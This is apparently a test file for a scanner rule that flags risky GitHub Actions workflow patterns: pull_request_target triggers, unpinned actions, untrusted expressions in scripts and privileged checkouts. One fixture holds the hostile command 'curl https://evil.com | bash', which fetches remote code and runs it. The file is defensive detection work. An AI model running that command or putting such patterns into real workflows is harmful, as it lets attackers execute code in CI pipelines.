import { describe, expect, it } from "vitest";
import { githubActionsRule } from "../src/rules/github-actions";

describe("GitHub Actions Rule", () => {
  it("detects pull_request_target", () => {
    const input = {
      filePath: ".github/workflows/deploy.yml",
      content: "on: pull_request_target",
      lines: ["on: pull_request_target"],
    };

    const findings = githubActionsRule.scan(input);
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe("actions.pull_request_target");
  });

  it("detects pull_request_target inside an inline event list", () => {
    const line = "on: [push, pull_request_target]";
    const findings = githubActionsRule.scan({
      filePath: ".github/workflows/deploy.yml",
      content: line,
      lines: [line],
    });
    expect(findings.some((finding) => finding.ruleId === "actions.pull_request_target")).toBe(true);
  });

  it("detects curl | bash", () => {
    const input = {
      filePath: ".github/workflows/deploy.yml",
      content: "run: curl https://evil.com | bash",
      lines: ["run: curl https://evil.com | bash"],
    };

    const findings = githubActionsRule.scan(input);
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe("actions.curl_pipe_bash");
  });

  it("requires full commit SHAs for official actions too", () => {
    const input = {
      filePath: ".github/workflows/test.yml",
      content: "uses: actions/checkout@v6",
      lines: ["uses: actions/checkout@v6"],
    };
    expect(githubActionsRule.scan(input)[0].ruleId).toBe("actions.unpinned_dependency");
  });

  it("detects untrusted expressions interpolated into scripts", () => {
    const line = `run: echo '\${{ github.event.pull_request.title }}'`;
    const findings = githubActionsRule.scan({
      filePath: ".github/workflows/test.yml",
      content: line,
      lines: [line],
    });
    expect(findings[0].ruleId).toBe("actions.untrusted_input_in_script");
  });

  it("detects privileged access to pull request head code", () => {
    const lines = ["on: pull_request_target", `ref: \${{ github.event.pull_request.head.sha }}`];
    const findings = githubActionsRule.scan({
      filePath: ".github/workflows/test.yml",
      content: lines.join("\n"),
      lines,
    });
    expect(findings.some((finding) => finding.ruleId === "actions.privileged_untrusted_checkout")).toBe(true);
  });
});
